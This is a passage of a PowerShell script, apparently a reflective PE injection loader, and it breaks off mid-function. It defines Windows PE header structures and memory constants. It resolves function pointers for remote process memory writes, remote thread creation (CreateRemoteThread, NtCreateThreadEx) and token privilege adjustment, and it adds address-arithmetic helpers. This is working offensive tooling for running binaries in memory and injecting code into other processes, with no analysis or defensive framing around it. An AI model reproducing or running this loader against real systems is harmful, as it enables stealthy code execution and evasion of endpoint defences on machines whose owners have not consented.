		    $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		    $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		    $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		    #Struct IMAGE_DOS_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		    $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		    $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		    $e_resField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		    $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		    $e_res2Field.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		    $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		    #Struct IMAGE_SECTION_HEADER
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		    $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		    $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		    $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		    $nameField.SetCustomAttribute($AttribBuilder)

		    $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		    #Struct IMAGE_BASE_RELOCATION
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		    $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		    #Struct IMAGE_IMPORT_DESCRIPTOR
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		    $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		    #Struct IMAGE_EXPORT_DIRECTORY
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		    $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		    $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		    #Struct LUID
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		    $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		    $LUID = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		    #Struct LUID_AND_ATTRIBUTES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		    $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		    $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		    $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		    #Struct TOKEN_PRIVILEGES
		    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		    $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		    $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		    $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		    $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		    $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		    return $Win32Types
	    }

	    Function Get-Win32Constants
	    {
		    $Win32Constants = New-Object System.Object
		
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		    $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		    return $Win32Constants
	    }

	    Function Get-Win32Functions
	    {
		    $Win32Functions = New-Object System.Object
		
		    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		    $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		    $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		    $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		    $memsetAddr = Get-ProcAddress msvcrt.dll memset
		    $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		    $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		    $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		    $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		    $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		    $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		    $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		    $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		    $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		    $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		    $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		    $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		    $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		    $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		    $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		    $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		    $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		    $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		    $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
            $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		    $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
            $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
            $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		    $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
            $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
            $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		    $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
            $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
            $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		    $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
            $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
            $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
            $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
            $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
            $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
            $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
            $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
            $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
            $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
            $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		    $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		    $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
            $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
            $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		    return $Win32Functions
	    }
	    #####################################

			
	    #####################################
	    ###########    HELPERS   ############
	    #####################################

	    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	    Function Sub-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    $Val = $Value1Bytes[$i] - $CarryOver
				    #Sub bytes
				    if ($Val -lt $Value2Bytes[$i])
				    {
					    $Val += 256
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
				
				
				    [UInt16]$Sum = $Val - $Value2Bytes[$i]

				    $FinalBytes[$i] = $Sum -band 0x00FF
			    }
		    }
		    else
		    {
			    Throw "Cannot subtract bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Add-SignedIntAsUnsigned
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		    [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    $CarryOver = 0
			    for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			    {
				    #Add bytes
				    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				    $FinalBytes[$i] = $Sum -band 0x00FF
				
				    if (($Sum -band 0xFF00) -eq 0x100)
				    {
					    $CarryOver = 1
				    }
				    else
				    {
					    $CarryOver = 0
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot add bytearrays of different sizes"
		    }
		
		    return [BitConverter]::ToInt64($FinalBytes, 0)
	    }
	

	    Function Compare-Val1GreaterThanVal2AsUInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [Int64]
		    $Value1,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [Int64]
		    $Value2
		    )
		
		    [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		    [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		    if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		    {
			    for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			    {
				    if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				    {
					    return $true
				    }
				    elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				    {
					    return $false
				    }
			    }
		    }
		    else
		    {
			    Throw "Cannot compare byte arrays of different size"
		    }
		
		    return $false
	    }
	

	    Function Convert-UIntToInt
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [UInt64]
		    $Value
		    )
		
		    [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		    return ([BitConverter]::ToInt64($ValueBytes, 0))
	    }
	
	
	    Function Test-MemoryRangeValid
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [String]
		    $DebugString,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $PEInfo,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $EndAddress,
		
		    [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		    [IntPtr]
		    $Size
		    )
		
		    [IntPtr]$FinalEndAddress = [IntPtr]::Zero
		    if ($PsCmdlet.ParameterSetName -eq "Size")
		    {
			    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		    }
		    else
		    {
			    $FinalEndAddress = $EndAddress
		    }
		
		    $PEEndAddress = $PEInfo.EndAddress
		
		    if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		    }
		    if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory greater than allocated address range. $DebugString"
		    }
	    }
	
	
	    Function Write-BytesToMemory
	    {
		    Param(
			    [Parameter(Position=0, Mandatory = $true)]
			    [Byte[]]
			    $Bytes,
			
			    [Parameter(Position=1, Mandatory = $true)]
			    [IntPtr]
			    $MemoryAddress
		    )
	
		    for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		    {
			    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		    }
	    }
	

	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-DelegateType
	    {
	        Param
